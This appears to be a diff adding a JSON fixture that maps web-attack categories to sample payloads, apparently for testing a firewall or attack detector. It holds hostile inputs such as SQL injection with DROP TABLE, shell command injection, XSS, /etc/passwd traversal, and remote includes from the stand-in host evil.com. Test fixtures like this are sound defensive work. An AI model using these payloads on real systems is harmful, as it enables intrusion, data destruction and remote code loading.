@@ -1,0 +1,82 @@
+{
+  "ABUSE_OF_FUNCTIONALITY": {
+    "description": "Uses site features to abuse access control.",
+    "payload": "/logout?next=/admin"
+  },
+  "AUTH_ATTACK": {
+    "description": "Authentication bypass via SQL logic.",
+    "payload": "' OR '1'='1' --"
+  },
+  "BUFFER_OVERFLOW": {
+    "description": "Overflows buffer with excessive input.",
+    "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  },
+  "COMMAND_EXECUTION": {
+    "description": "Shell command injection via semicolon.",
+    "payload": "test; whoami"
+  },
+  "XSS_INLINE": {
+    "description": "Basic reflected JavaScript injection.",
+    "payload": "<script>alert('xss')</script>"
+  },
+  "DETECTION_EVASION": {
+    "description": "URL-encoded SQL bypass attempt.",
+    "payload": "%27%20OR%20%271%27%3D%271"
+  },
+  "DIRECTORY_INDEXING": {
+    "description": "Accesses open directory without index file.",
+    "payload": "/admin/"
+  },
+  "HTTP_RESPONSE_SPLITTING": {
+    "description": "Header injection to split response.",
+    "payload": "test%0d%0aSet-Cookie:%20evil=true"
+  },
+  "INFORMATION_LEAKAGE": {
+    "description": "Requests potentially sensitive debug endpoint.",
+    "payload": "/debug"
+  },
+  "LDAP_INJECTION": {
+    "description": "Attempts wildcard LDAP query injection.",
+    "payload": "*(|(uid=*))"
+  },
+  "NON_BROWSER_CLIENT": {
+    "description": "Simulates scripted UA.",
+    "payload": "Python-urllib/3.11"
+  },
+  "OTHER_APP_ATTACK": {
+    "description": "Accesses system files via traversal.",
+    "payload": "/index.php?page=../../../etc/passwd"
+  },
+  "PATH_TRAVERSAL": {
+    "description": "Classic directory traversal test.",
+    "payload": "../../etc/passwd"
+  },
+  "PREDICTABLE_RESOURCE": {
+    "description": "Requests hidden VCS file.",
+    "payload": "/.git/config"
+  },
+  "REMOTE_FILE_INCLUDE": {
+    "description": "Injects external shell URL.",
+    "payload": "/index.php?page=http://evil.com/shell.txt"
+  },
+  "SERVER_SIDE_CODE_INJECTION": {
+    "description": "Injects server-side code template.",
+    "payload": "{{7*7}}"
+  },
+  "SQL_INJECTION": {
+    "description": "Injects DROP TABLE via SQL logic.",
+    "payload": "'; DROP TABLE users --"
+  },
+  "TROJAN_BACKDOOR_SPYWARE": {
+    "description": "Attempts to load remote malware.",
+    "payload": "<iframe src='http://evil.com/backdoor.exe'>"
+  },
+  "VULNERABILITY_SCAN": {
+    "description": "Typical vulnerability scan fingerprint.",
+    "payload": "/?scan=true&payload={{%25%25eval%25%25}}"
+  },
+  "XPATH_INJECTION": {
+    "description": "Injects XPath condition to manipulate queries.",
+    "payload": "' or count(//user) = 1 or '1' = '2"
+  }
+}
